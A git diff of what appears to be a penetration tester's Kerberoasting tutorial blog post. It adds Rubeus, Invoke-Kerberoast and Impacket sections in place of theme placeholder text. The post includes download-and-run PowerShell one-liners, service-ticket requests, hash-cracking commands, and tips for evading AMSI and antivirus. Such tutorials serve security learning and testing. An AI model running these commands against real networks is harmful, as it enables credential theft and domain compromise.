@@ -51,15 +51,23 @@ PowerView is an insanely powerful **.ps1** created by Harmj0y which makes Enumer
 
 First let's import `PowerView.ps1` into Memory with 
 
-```IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')```
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://werbserver:80/PowerView.ps1')
+```
+
+
 
 Of course `AMSI` will probably catch this on `WIN10 1803` but I will leave evasion upto yourselfs. There are numerous bypasses in my `h4cks` Repo and numerous out there online. `AMSI` is just string detection so it's easy to slip past.
 
 Now with PowerView in memory on a **Domain-Joined Machine** we can simply run
 
-`Get-DomainUser -SPN` 
+```powershell
+Get-DomainUser -SPN
+```
 
-The `Get-DomainUser` function also supports the `-Credential` switch which allows you to pass a seperate credential through. For ex.
+
+
+The ```Get-DomainUser``` function also supports the `-Credential` switch which allows you to pass a seperate credential through. For ex.
 
 ```
 $secpasswd = ConvertTo-SecureString 'pass' -AsPlainText -Force
@@ -78,13 +86,17 @@ Now with the target service accounts in our scopes we can actually request a tic
 
 Just simply run the below command
 
-`Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat -Credential $cred`
+```
+Get-DomainSPNTicket -SPN <spn> -OutputFormat hashcat -Credential $cred
+```
 
 This will return a SPN Ticket encrypted with the `NTLM` hash of the target account. Bare in mind here I choose Hashcat over John as I use a Nvidia cracking rig but works way way better with Hashcat.
 
 Now we can simply crack with something like
 
-`hashcat64.exe -a -m 13100 SPN.hash /wordlists/rockyou.txt`
+```
+hashcat64.exe -a -m 13100 SPN.hash /wordlists/rockyou.txt
+```
 
 Of course this is as simple cracking attack as it's just against a simple wordlist but if this was in the real world you would through rule sets and much more probable wordlists into the mix.
 
@@ -135,104 +147,101 @@ Now we are armed with target accounts let's boot up `Rubeus`
 
 
 
-### [](#header-3)Header 3
+To get Rubeus you will actually need `Visual Studio 2017` or anything that can compile `.NET`. In my case I use Visual Studio and build myself an assembly. Luckily at the moment the default build of Rubeus is only detected by one AV vendor on Virus Total however if your AV is flagging it just change some strings and comments and rebuild the project and your AV will shut up.  That's the beauty of open-source C# / .NET Projects, much easier to circumvent anti-virus solutions.
 
-```js
-// Javascript code with syntax highlighting.
-var fun = function lang(l) {
-  dateformat.i18n = require('./lang/' + l)
-  return true;
-}
+
+
+Armed with out assembly/exe we can simply drop it on the target **Domain-Joined Machine** in the context of a domain user and start Roasting. 
+
+
+
+Rubeus Github has an amazing explanation on all it's features and it's ability to target specific `OU's` `Users` etc etc so I will try not to copy it word-for-word but merely show it's capabilities. 
+
+
+
+First we can try to Roast all Users in the Current Domain (May be Noise)
+
+```powershell
+PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast
 ```
 
-```ruby
-# Ruby code with syntax highlighting
-GitHubPages::Dependencies.gems.each do |gem, version|
-  s.add_dependency(gem, "= #{version}")
-end
+
+
+Kerberoast All Users in a Specific OU (Good if Organization has all Service Accounts in a Specific OU)
+
+```powershell
+PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /ou:OU=SerivceAcc,DC=m0chanAD,DC=local
 ```
 
-#### [](#header-4)Header 4
-
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-*   This is an unordered list following a header.
-
-##### [](#header-5)Header 5
-
-1.  This is an ordered list following a header.
-2.  This is an ordered list following a header.
-3.  This is an ordered list following a header.
-
-###### [](#header-6)Header 6
-
-| head1        | head two          | three |
-|:-------------|:------------------|:------|
-| ok           | good swedish fish | nice  |
-| out of stock | good and plenty   | nice  |
-| ok           | good `oreos`      | hmm   |
-| ok           | good `zoute` drop | yumm  |
-
-### There's a horizontal rule below this.
-
-* * *
-
-### Here is an unordered list:
-
-*   Item foo
-*   Item bar
-*   Item baz
-*   Item zip
-
-### And an ordered list:
-
-1.  Item one
-1.  Item two
-1.  Item three
-1.  Item four
-
-### And a nested list:
-
-- level 1 item
-  - level 2 item
-  - level 2 item
-    - level 3 item
-    - level 3 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-  - level 2 item
-  - level 2 item
-- level 1 item
-
-### Small image
-
-![](https://assets-cdn.github.com/images/icons/emoji/octocat.png)
-
-### Large image
-
-![](https://guides.github.com/activities/hello-world/branching.png)
 
 
-### Definition lists can be used with HTML syntax.
-
-<dl>
-<dt>Name</dt>
-<dd>Godzilla</dd>
-<dt>Born</dt>
-<dd>1952</dd>
-<dt>Birthplace</dt>
-<dd>Japan</dd>
-<dt>Color</dt>
-<dd>Green</dd>
-</dl>
+This may generate a lot of Output so we can Output all the Hashes to a file for easier Management and Cracking.
 
 ```
-Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long. This line should be long enough to demonstrate this.
+/outfile:C:\Temp\TotallyNotHashes.txt
 ```
 
+
+
+Roasting a Specific Users or SPN 
+
+```powershell
+PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /user:mssqlservice
+
+PS C:\Users\m0chan\Desktop > .\Rubeus kerberoast /spn:MSSQLSvc/SQL.m0chanAD.local
 ```
-The final element.
+
+
+
+There is also the ability to Roast users in a foreign trust domain providing the trust relationships allow you but you can check out the Rubeus Repo for full explanation on that. It's really cool. 
+
+
+
+## [](#header-5)Invoke-Kerberoast.ps1
+
+
+
+The final script I will talk about in the Windows Section is `Invoke-Kerberoast.ps1` which isn't nearly as powerful as `Rubeus` or `Powerview` hence why I will not split it up into Enumeration/Exploit like previous sections. 
+
+`Invoke-Kerberoast.ps1`. can be Invoked and executed using the below `one-liner`
+
+```powershell
+PS C:\Temp > IEX(new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+
+#Download Invoke-Kerberoast.ps1 into Memory (AMSI May Flag)
+IEX(new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
+
+#Invoke-Kerberoast and Output to Hashcat Format
+
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
+
+
+
+
+
+## [](#header-3)From Linux
+
+
+
+Kerberoasting from Linux is a little but different as we are most likely not authenticated to the domain in anyway so will have to pass a stolen Kerberos ticket through for authentication or domain credentials.  
+
+In my experience I have found Kerberoasting from a **Domain-Joined Machine** is way way easier and typically hassle free however sometime we don't have the option. 
+
+
+
+To enumerate Users with `SPN` value set we can use one of `Impackets` great scripts `GetUserSPN's.py` 
+
+*https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py*
+
+If you haven't heard of Impacket by now it's a collection of python scripts for attacking Windows and has some seriously dangerous scripts in it's repo. 
+
+Armed with `GetUserSPNs.py` and a already pwned `Domain Users` credentials we can simply run the below
+
+```python
+m0chan@kali:/scripts/ > python GetUserSPNs.py m0chanAD/pwneduser:pwnedcreds -outputfile hashes.kerberoast
+```
+
+
+
+This outputed file can now be sent to Hashcat to crack, there are alternative means to cracking on Linux but in all my time Hacking I have never once had a good time trying to crack on Linux. I find Hashcat on a Windows machine with NVIDIA cards is the best route (personally).
